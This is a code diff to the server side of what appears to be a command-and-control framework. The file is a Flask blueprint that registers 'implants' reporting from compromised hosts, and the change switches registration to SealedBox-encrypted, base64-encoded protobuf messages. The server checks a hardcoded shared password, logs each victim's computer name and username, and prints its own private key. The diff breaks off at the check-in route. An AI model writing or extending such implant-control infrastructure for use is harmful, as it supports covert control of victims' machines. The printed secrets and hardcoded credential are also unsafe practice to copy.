@@ -1,6 +1,6 @@
 # rpc blueprint - Implant <--> Server
 
-from flask import Blueprint, request , abort  # type: ignore
+from flask import Blueprint, request , abort, Response  # type: ignore
 
 from cvnt.implant_pb2 import * 
 
@@ -10,7 +10,7 @@ from cvnt.db_operations import *
 import base64
 
 from cvnt.constants import *
-from nacl.public import PrivateKey, Box
+from nacl.public import PrivateKey, Box, SealedBox
 from nacl.encoding import HexEncoder
 
 import sys
@@ -19,74 +19,71 @@ rpc = Blueprint("rpc", __name__)
 
 PASSWORD = "SUPER_COMPLEX_PASSWORD_WOWZA!!!"
 
-# Load the server's private key from a file
-# def load_private_key():
-#     with open('/home/ubuntu/BinaryBaddies/cvnt/cvnt/server_private_key.txt', 'rb') as key_file:
-#         private_key_hex = key_file.read().strip()
-#         return PrivateKey(private_key_hex)
+#Load the server's private key from a file
+def load_private_key():
+    with open('/home/ubuntu/BinaryBaddies/cvnt/cvnt/server_private_key.txt', 'rb') as key_file:
+        private_key_hex = key_file.read().strip()
+        return PrivateKey(private_key_hex)
 
-# server_private_key = load_private_key()
-# print(server_private_key, "server private key")
+server_private_key = load_private_key()
+print(server_private_key, "server private key")
 
 @rpc.route('/register', methods=['POST'])
 def handle_register():
-    # ip = request.remote_addr
-    # base64_encrypted_message = request.data
-    # print(base64_encrypted_message, "data received on server")
-
-    # try:
-    #     # Decode the Base64 encoded data
-    #     encrypted_message = base64.b64decode(base64_encrypted_message)
-    #     print(encrypted_message, "b64 decoded encrypted message")
-
-    #     # Create a box with only the server's private key (since we use SealedBox for single key encryption)
-    #     box = Box(server_private_key, server_private_key.public_key)
-
-    #     # Decrypt the message
-    #     decrypted_message = box.decrypt(encrypted_message)
-
-    #     # Parse the decrypted message using protobuf
-    #     register = RegisterImplant()
-    #     register.ParseFromString(decrypted_message)
-
-    #     print(f'[+] New Implant: from {ip}')
-    #     print(f'[+]    * ImplantID: {register.ImplantID}')
-    #     print(f'[+]    * ComputerName: {register.ComputerName}')
-    #     print(f'[+]    * Public Key: {register.PublicKey}')
-    #     print(f'[+]    * Username: {register.Username}')
-    #     print(f'[+]    * Password: {register.Password}')
-
-    #     if register.Password != PASSWORD:
-    #         abort(404)
-
-    #     # Here you would normally store the implant's information in the database
-    #     r = register_implant(make_implant(register, ip))
-
-    #     print("[+] Watch out sexy ;) a New Implant connected!")
-
-    #     return Response("Successfully registered", status=200)
-    # except Exception as e:
-    #     print(f"Error during registration: {str(e)}")
-    #     return Response("Registration failed", status=500)
-
     ip = request.remote_addr
-    reg_data = request.get_data()
-    register = RegisterImplant()
-    register.ParseFromString(reg_data)
-    print(f'[+] New Implant: from {request.remote_addr}')
-    print(f'[+]    * ImplantID: {register.ImplantID}')
-    print(f'[+]    * ComputerName: {register.ComputerName}')
-    print(f'[+]    * Username: {register.Username}')
-    print(f'[+]    * Password: {register.Password}')
+    base64_encrypted_message = request.data
+    print(base64_encrypted_message, "data received on server")
 
-    if register.Password != PASSWORD:
-        abort(404)
+    try:
+        # Decode the Base64 encoded data
+        encrypted_message = base64.b64decode(base64_encrypted_message)
+        print(encrypted_message, "b64 decoded encrypted message")
 
-    r = register_implant(make_implant(register, ip))
+        decrypted_message = SealedBox(server_private_key).decrypt(encrypted_message)
+        print(decrypted_message, "decrypted")
 
-    print("[+] Watch out sexy ;) a New Implant connected!")
+        # Parse the decrypted message using protobuf
+        register = RegisterImplant()
+        register.ParseFromString(decrypted_message)
 
-    return SUCCESSFUL
+        print(f'[+] New Implant: from {ip}')
+        print(f'[+]    * ImplantID: {register.ImplantID}')
+        print(f'[+]    * ComputerName: {register.ComputerName}')
+        #print(f'[+]    * Public Key: {register.PublicKey}')
+        print(f'[+]    * Username: {register.Username}')
+        print(f'[+]    * Password: {register.Password}')
+
+        if register.Password != PASSWORD:
+            abort(404)
+
+        # Here you would normally store the implant's information in the database
+        r = register_implant(make_implant(register, ip))
+
+        print("[+] Watch out sexy ;) a New Implant connected!")
+
+        return Response("Successfully registered", status=200)
+    except Exception as e:
+        print(f"Error during registration: {str(e)}")
+        return Response("Registration failed", status=500)
+
+    # ip = request.remote_addr
+    # reg_data = request.get_data()
+    # register = RegisterImplant()
+    # register.ParseFromString(reg_data)
+    # print(f'[+] New Implant: from {request.remote_addr}')
+    # print(f'[+]    * ImplantID: {register.ImplantID}')
+    # print(f'[+]    * ComputerName: {register.ComputerName}')
+    # print(f'[+]    * Username: {register.Username}')
+    # print(f'[+]    * Password: {register.Password}')
+
+    # if register.Password != PASSWORD:
+    #     abort(404)
+
+    # r = register_implant(make_implant(register, ip))
+
+    # print("[+] Watch out sexy ;) a New Implant connected!")
+
+    # return SUCCESSFUL
 
 @rpc.route("/checkin", methods=["POST"])
 def checkin():
